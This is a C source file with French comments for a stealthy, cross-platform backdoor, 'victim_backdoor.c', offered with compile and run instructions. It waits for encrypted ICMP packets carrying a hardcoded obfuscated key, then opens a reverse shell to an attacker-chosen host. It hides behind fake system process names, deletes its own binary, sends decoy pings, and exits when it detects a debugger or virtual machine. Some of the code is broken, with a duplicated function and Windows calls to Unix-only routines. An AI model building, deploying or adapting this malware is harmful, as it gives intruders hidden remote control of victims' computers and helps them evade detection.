/*
 * victim_backdoor.c
 *
 * Backdoor ICMP – Victime autonome, furtive et multiplateforme.
 *
 * Améliorations intégrées :
 * - Chiffrement AES-256-GCM avec dérivation de clé via PBKDF2.
 * - La clé prépartagée est stockée obfusquée (XOR 0x55) et déobfusquée au démarrage.
 * - Vérifications anti‑débogage (IsDebuggerPresent sous Windows, TracerPid et contrôle de latence sous Unix).
 * - Détection anti‑VM (via /proc/cpuinfo sur Unix).
 * - Renommage dynamique du processus (avec composante temporelle, et modification plus poussée en mode sleep).
 * - Mode sleep/wake amélioré : en mode sleep, la backdoor se met en veille profonde (dormant),
 *   se renomme en "init" via prctl (sur Linux) et n'exécute aucune commande autre que "wake".
 * - Supervision autonome : le parent relance le listener s’il se termine.
 * - Self‑delete : le binaire tente de se supprimer du disque au démarrage.
 * - Décoys : envoie périodiquement des pings légitimes pour noyer le trafic malveillant.
 *
 * Compilation (Unix) :
 *    gcc -Wall -Wextra -O2 -D_FORTIFY_SOURCE=2 -o victim_backdoor victim_backdoor.c -lcrypto -lpthread
 *
 * Sous Windows (MinGW) :
 *    gcc -Wall -Wextra -O2 -o victim_backdoor.exe victim_backdoor.c -lws2_32 -lcrypto
 *
 * Exécution :
 *   - Unix : exécuter en root (raw sockets) : sudo ./victim_backdoor
 *   - Windows : exécuter en tant qu'administrateur
 *
 * Mode verbeux : victim_backdoor -v
 */

#ifdef _WIN32
  #include <winsock2.h>
  #include <ws2tcpip.h>
  #include <windows.h>
  #include <stdio.h>
  #include <stdlib.h>
  #include <string.h>
  #include <signal.h>
  #pragma comment(lib, "ws2_32.lib")
#else
  #include <stdio.h>
  #include <stdlib.h>
  #include <unistd.h>
  #include <string.h>
  #include <signal.h>
  #include <errno.h>
  #include <sys/types.h>
  #include <sys/socket.h>
  #include <sys/wait.h>
  #include <netinet/in.h>
  #include <netinet/ip.h>
  #include <netinet/ip_icmp.h>
  #include <arpa/inet.h>
  #include <netdb.h>
  #include <time.h>
  #include <pthread.h>
  #include <sys/prctl.h>
#endif

#include <openssl/evp.h>
#include <openssl/err.h>
#include <openssl/pkcs5.h>
#include <openssl/rand.h>

/* --- Configuration de base --- */
#define BUFF_SIZE    1024

/* La clé réelle "wA@2mC!dq" est obfusquée par XOR avec 0x55 */
static unsigned char obf_secret[] = { 0x22, 0x14, 0x15, 0x67, 0x38, 0x16, 0x74, 0x31, 0x24 };
static char g_secret_key[10] = {0};  /* Déobfusquée au démarrage */

#define SALT_LEN 16
#define IV_LEN   12
#define TAG_LEN  16

#ifndef _WIN32
const char *service_names[] = { "svchost", "launchd", "cron", "udevd", "kworker", "systemd", "init" };
#endif

#ifdef _WIN32
  #define SHELL_PATH   "cmd.exe"
#elif defined(__APPLE__)
  #define SHELL_PATH   "/bin/zsh"
#elif defined(__FreeBSD__) || defined(__OpenBSD__) || defined(__NetBSD__)
  #define SHELL_PATH   "/bin/sh"
#else
  #define SHELL_PATH   "/bin/bash"
#endif

#ifdef _WIN32
typedef struct {
    char reverse_ip[64];
    unsigned short reverse_port;
} TriggerInfo;
#endif

/* --- Variable globale pour le mode sleep --- */
volatile int dormant = 0;

#ifndef _WIN32
/* Pour renommer le processus, on utilise prctl() */
void set_process_name(const char *name) {
    prctl(PR_SET_NAME, name, 0, 0, 0);
}
#endif

/* --- Déobfuscation de la clé (XOR 0x55) --- */
void deobfuscate(char *dest, const unsigned char *src, int len) {
    for (int i = 0; i < len; i++) {
        dest[i] = src[i] ^ 0x55;
    }
    dest[len] = '\0';
}

#ifndef _WIN32
/* --- Contrôle de latence anti-débogage --- */
int check_timing() {
    struct timespec start, end;
    clock_gettime(CLOCK_MONOTONIC, &start);
    volatile int dummy = 0;
    for (int i = 0; i < 100000000; i++) dummy++;
    clock_gettime(CLOCK_MONOTONIC, &end);
    long elapsed = (end.tv_sec - start.tv_sec) * 1000 +
                   (end.tv_nsec - start.tv_nsec) / 1000000;
    return (elapsed > 500);
}
#endif

/* --- Anti-débogage --- */
#ifdef _WIN32
int is_debugger_present() {
    return IsDebuggerPresent();
}
#else
int is_debugger_present() {
    FILE *f = fopen("/proc/self/status", "r");
    if (!f) return 0;
    char line[128];
    int debugger = 0;
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "TracerPid:", 10) == 0) {
            if (atoi(line + 10) != 0)
                debugger = 1;
            break;
        }
    }
    fclose(f);
    return debugger;
}
#endif

#ifndef _WIN32
/* --- Anti-VM --- */
int is_vm_detected() {
    FILE *f = fopen("/proc/cpuinfo", "r");
    if (!f) return 0;
    char line[256];
    int vm = 0;
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, "hypervisor") || strstr(line, "VirtualBox") || strstr(line, "VMware"))
            vm = 1;
    }
    fclose(f);
    return vm;
}
#endif

#ifndef _WIN32
/* --- Auto-destruction --- */
void auto_destroy() {
    memset(g_secret_key, 0, sizeof(g_secret_key));
    exit(EXIT_FAILURE);
}
#endif

#ifndef _WIN32
/* --- Self-delete --- */
void self_delete(const char *path) {
    unlink(path);
}
#endif

/* --- Dérivation de clé AES-256 via PBKDF2 --- */
int derive_key(const unsigned char *salt, int salt_len, unsigned char *key_out, int key_len) {
    if (PKCS5_PBKDF2_HMAC(g_secret_key, strlen(g_secret_key),
                          salt, salt_len,
                          2000, EVP_sha256(), key_len, key_out) != 1)
        return 0;
    return 1;
}

/* --- Déchiffrement AES-256-GCM ---
   Format du payload : [salt (16)] [IV (12)] [ciphertext] [tag (16)]
   Le plaintext doit être : "<SECRET> <commande> [param]"
   Commandes supportées :
     - Reverse shell : "<SECRET> <reverse_ip> <reverse_port>"
     - Sleep : "<SECRET> sleep [duration]"  (si durée omise, sommeil indéfini)
     - Wake  : "<SECRET> wake"
*/
int aes_gcm_decrypt(unsigned char *payload, int payload_len, unsigned char *plaintext) {
    if (payload_len < (SALT_LEN + IV_LEN + TAG_LEN))
        return -1;
    unsigned char salt[SALT_LEN], iv[IV_LEN], tag[TAG_LEN];
    memcpy(salt, payload, SALT_LEN);
    memcpy(iv, payload + SALT_LEN, IV_LEN);
    int ciphertext_len = payload_len - SALT_LEN - IV_LEN - TAG_LEN;
    if (ciphertext_len <= 0) return -1;
    unsigned char *ciphertext = payload + SALT_LEN + IV_LEN;
    memcpy(tag, payload + SALT_LEN + IV_LEN + ciphertext_len, TAG_LEN);
    unsigned char derived_key[32];
    if (!derive_key(salt, SALT_LEN, derived_key, 32))
        return -1;
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    int len, plaintext_len = 0, ret = -1;
    if (!ctx) return -1;
    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1)
        goto cleanup;
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, IV_LEN, NULL) != 1)
        goto cleanup;
    if (EVP_DecryptInit_ex(ctx, NULL, NULL, derived_key, iv) != 1)
        goto cleanup;
    if (EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len) != 1)
        goto cleanup;
    plaintext_len = len;
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, TAG_LEN, tag) != 1)
        goto cleanup;
    ret = EVP_DecryptFinal_ex(ctx, plaintext + len, &len);
    if (ret > 0)
        plaintext_len += len;
    else
        plaintext_len = -1;
cleanup:
    EVP_CIPHER_CTX_free(ctx);
    return plaintext_len;
}

#ifdef _WIN32
DWORD WINAPI trigger_handler(LPVOID param) {
    TriggerInfo *info = (TriggerInfo*)param;
    initiate_reverse_shell(info->reverse_ip, info->reverse_port);
    free(info);
    return 0;
}
#endif

#ifdef _WIN32
void initiate_reverse_shell(const char *server_ip, unsigned short server_port) {
    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    struct addrinfo hints, *res, *p;
    char port_str[16];
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0)
         return;
    snprintf(port_str, sizeof(port_str), "%d", server_port);
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(server_ip, port_str, &hints, &res) != 0) {
         WSACleanup();
         return;
    }
    for (p = res; p != NULL; p = p->ai_next) {
         sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
         if (sock == INVALID_SOCKET)
              continue;
         if (connect(sock, p->ai_addr, (int)p->ai_addrlen) == 0)
              break;
         closesocket(sock);
         sock = INVALID_SOCKET;
    }
    freeaddrinfo(res);
    if (sock == INVALID_SOCKET) {
         WSACleanup();
         return;
    }
    SetHandleInformation((HANDLE)sock, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput  = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError  = (HANDLE)sock;
    if (!CreateProcessA(NULL, (LPSTR)SHELL_PATH, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
         closesocket(sock);
         WSACleanup();
         return;
    }
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);
    WSACleanup();
}
#else
void initiate_reverse_shell(const char *server_ip, unsigned short server_port) {
    int sock;
    char port_str[16];
    struct addrinfo hints, *res, *p;
    snprintf(port_str, sizeof(port_str), "%d", server_port);
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(server_ip, port_str, &hints, &res) != 0)
         return;
    for (p = res; p != NULL; p = p->ai_next) {
         sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
         if (sock < 0)
              continue;
         if (connect(sock, p->ai_addr, p->ai_addrlen) == 0)
              break;
         close(sock);
    }
    if (p == NULL) {
         freeaddrinfo(res);
         return;
    }
    freeaddrinfo(res);
    const char *banner = "/bin/bash\n";
    write(sock, banner, strlen(banner));
    dup2(sock, STDIN_FILENO);
    dup2(sock, STDOUT_FILENO);
    dup2(sock, STDERR_FILENO);
    execl(SHELL_PATH, SHELL_PATH, (char *)NULL);
    close(sock);
}
#endif

#ifndef _WIN32
/* Traitement du payload.
   Le plaintext doit être : "<SECRET> <commande> [param]"
   Commandes :
      - Reverse shell : "<SECRET> <reverse_ip> <reverse_port>"
      - Sleep : "<SECRET> sleep [duration]"
      - Wake  : "<SECRET> wake"
*/
void handle_trigger(unsigned char *payload, int payload_len) {
    int pt_len = aes_gcm_decrypt(payload, payload_len, payload);
    if (pt_len <= 0) return;
    payload[pt_len] = '\0';
    char trigger_key[64], command[64], param[64];
    int tokens = sscanf((char *)payload, "%63s %63s %63s", trigger_key, command, param);
    if (tokens < 2) return;
    if (strcmp(trigger_key, g_secret_key) != 0) return;
    if (strcmp(command, "sleep") == 0) {
        int duration = 0;
        if (tokens == 3)
            duration = atoi(param);
        dormant = 1;
        /* Pour masquer davantage, renommer le processus en "init" */
        #ifndef _WIN32
        set_process_name("init");
        #endif
        if (duration > 0) {
            sleep(duration);
            dormant = 0;
            /* Rétablir le nom dynamique initial */
            #ifndef _WIN32
            int num_names = sizeof(service_names) / sizeof(service_names[0]);
            char proc_name[32];
            snprintf(proc_name, sizeof(proc_name), "%s_%ld", service_names[rand() % num_names], time(NULL) % 1000);
            set_process_name(proc_name);
            #endif
        } else {
            /* Mode sommeil indéfini : attendre une commande "wake" */
            while (dormant)
                sleep(1);
            /* Au réveil, rétablir le nom dynamique */
            #ifndef _WIN32
            int num_names = sizeof(service_names) / sizeof(service_names[0]);
            char proc_name[32];
            snprintf(proc_name, sizeof(proc_name), "%s_%ld", service_names[rand() % num_names], time(NULL) % 1000);
            set_process_name(proc_name);
            #endif
        }
        return;
    }
    if (strcmp(command, "wake") == 0) {
        dormant = 0;
        #ifndef _WIN32
        int num_names = sizeof(service_names) / sizeof(service_names[0]);
        char proc_name[32];
        snprintf(proc_name, sizeof(proc_name), "%s_%ld", service_names[rand() % num_names], time(NULL) % 1000);
        set_process_name(proc_name);
        #endif
        return;
    }
    /* Si la backdoor est en mode dormant, ignorer les commandes autres que wake */
    if (dormant)
        return;
    /* Traitement de la commande reverse shell : format "<SECRET> <reverse_ip> <reverse_port>" */
    if (tokens == 3) {
        char reverse_ip[64];
        int reverse_port = atoi(param);
        if (reverse_port > 0) {
            if (fork() == 0) {
                initiate_reverse_shell(command, (unsigned short)reverse_port);
                exit(EXIT_SUCCESS);
            }
        }
    }
}
#endif

#ifdef _WIN32
void icmp_packet_listener(void) {
    SOCKET sockfd;
    char buffer[BUFF_SIZE + 1];
    int bytes_received;
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0)
         return;
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd == INVALID_SOCKET) {
         WSACleanup();
         return;
    }
    while (1) {
         memset(buffer, 0, sizeof(buffer));
         bytes_received = recv(sockfd, buffer, BUFF_SIZE, 0);
         if (bytes_received <= 0)
             continue;
         struct ip *ip_hdr = (struct ip *)buffer;
         int ip_header_len = ip_hdr->ip_hl * 4;
         struct icmp *icmp_hdr = (struct icmp *)(buffer + ip_header_len);
         if (icmp_hdr->icmp_type != ICMP_ECHO)
             continue;
         int payload_len = bytes_received - ip_header_len - sizeof(struct icmp);
         if (payload_len <= 0)
             continue;
         if (is_debugger_present())
             continue;
         unsigned char temp[BUFF_SIZE];
         memcpy(temp, icmp_hdr->icmp_data, payload_len);
         TriggerInfo *info = (TriggerInfo*)malloc(sizeof(TriggerInfo));
         if (!info) continue;
         int pt_len = aes_gcm_decrypt((unsigned char *)icmp_hdr->icmp_data, payload_len, temp);
         if (pt_len <= 0) { free(info); continue; }
         temp[pt_len] = '\0';
         char trigger_key[64], command[64], param[64];
         int tokens = sscanf((char *)temp, "%63s %63s %63s", trigger_key, command, param);
         if (tokens < 2) { free(info); continue; }
         if (strcmp(trigger_key, g_secret_key) != 0) { free(info); continue; }
         if (dormant && strcmp(command, "wake") != 0) { free(info); continue; }
         if (strcmp(command, "sleep") == 0 || strcmp(command, "wake") == 0) {
             handle_trigger((unsigned char *)temp, pt_len);
             free(info);
         } else {
             if (!dormant && tokens == 3) {
                 strncpy(info->reverse_ip, command, sizeof(info->reverse_ip)-1);
                 info->reverse_ip[sizeof(info->reverse_ip)-1] = '\0';
                 info->reverse_port = (unsigned short)atoi(param);
                 HANDLE threadHandle = CreateThread(NULL, 0, trigger_handler, info, 0, NULL);
                 if (threadHandle)
                     CloseHandle(threadHandle);
             } else {
                 free(info);
             }
         }
    }
    closesocket(sockfd);
    WSACleanup();
}
#else
void icmp_packet_listener(void) {
    int sockfd;
    unsigned char buffer[BUFF_SIZE + 1];
    ssize_t bytes_received;
    struct ip *ip_hdr;
    struct icmp *icmp_hdr;
    if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0) {
         perror("socket");
         exit(EXIT_FAILURE);
    }
    while (1) {
         memset(buffer, 0, sizeof(buffer));
         bytes_received = recv(sockfd, buffer, BUFF_SIZE, 0);
         if (bytes_received <= 0)
             continue;
         if (is_debugger_present() || is_vm_detected() || check_timing())
             auto_destroy();
         ip_hdr = (struct ip *)buffer;
         int ip_header_len = ip_hdr->ip_hl * 4;
         icmp_hdr = (struct icmp *)(buffer + ip_header_len);
         if (icmp_hdr->icmp_type != ICMP_ECHO)
             continue;
         int payload_len = bytes_received - ip_header_len - sizeof(struct icmp);
         if (payload_len < (SALT_LEN + IV_LEN + TAG_LEN))
             continue;
         handle_trigger(icmp_hdr->icmp_data, payload_len);
    }
    close(sockfd);
}
#endif

#ifndef _WIN32
/* Anti-VM simple pour Unix */
int is_vm_detected() {
    FILE *f = fopen("/proc/cpuinfo", "r");
    if (!f) return 0;
    char line[256];
    int vm = 0;
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, "hypervisor") || strstr(line, "VirtualBox") || strstr(line, "VMware"))
            vm = 1;
    }
    fclose(f);
    return vm;
}

/* Thread décoy : envoie périodiquement de vrais pings vers localhost pour noyer le trafic */
void *decoy_thread(void *arg) {
    (void)arg;
    while (1) {
         int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
         if (sock >= 0) {
             struct sockaddr_in addr;
             memset(&addr, 0, sizeof(addr));
             addr.sin_family = AF_INET;
             inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr);
             char buf[64] = "ping";
             sendto(sock, buf, strlen(buf), 0, (struct sockaddr*)&addr, sizeof(addr));
             close(sock);
         }
         sleep(5 + rand()%5);
    }
    return NULL;
}
#endif

#ifdef _WIN32
int main(int argc, char *argv[]) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    while (1) {
         icmp_packet_listener();
         Sleep(5000);
    }
    return 0;
}
#else
int main(int argc, char *argv[]) {
    char proc_name[32];
    signal(SIGCHLD, SIG_IGN);
    chdir("/");
    srand(time(NULL));
    /* Déobfuscation de la clé */
    deobfuscate(g_secret_key, obf_secret, sizeof(obf_secret));
    /* Renommage dynamique initial avec composante temporelle */
    int num_names = sizeof(service_names) / sizeof(service_names[0]);
    snprintf(proc_name, sizeof(proc_name), "%s_%ld", service_names[rand()%num_names], time(NULL)%1000);
    
    if (argc == 2 && strcmp(argv[1], "-v") == 0) {
         printf("Secret Key:\t%s\n", g_secret_key);
         printf("Service Name:\t%s\n", proc_name);
         printf("Shell Path:\t%s\n", SHELL_PATH);
         exit(EXIT_SUCCESS);
    }
    strncpy(argv[0], proc_name, strlen(argv[0]));
    for (int i = 1; i < argc; i++) {
         memset(argv[i], ' ', strlen(argv[i]));
    }
    /* Self-delete : tenter de supprimer le binaire */
    char *exec_path = argv[0];
    if (fork() == 0) {
         sleep(2);
         self_delete(exec_path);
         exit(EXIT_SUCCESS);
    }
    /* Lancer le thread décoy pour brouiller le trafic ICMP */
    pthread_t decoy_tid;
    pthread_create(&decoy_tid, NULL, decoy_thread, NULL);
    /* Supervision autonome : le parent surveille et relance l'enfant listener */
    while (1) {
         if (is_debugger_present() || is_vm_detected() || check_timing())
             auto_destroy();
         pid_t pid = fork();
         if (pid < 0) {
             perror("fork");
             exit(EXIT_FAILURE);
         }
         if (pid == 0) {
             icmp_packet_listener();
             exit(EXIT_SUCCESS);
         } else {
             int status;
             waitpid(pid, &status, 0);
             sleep(5);
         }
    }
    return EXIT_SUCCESS;
}
#endif
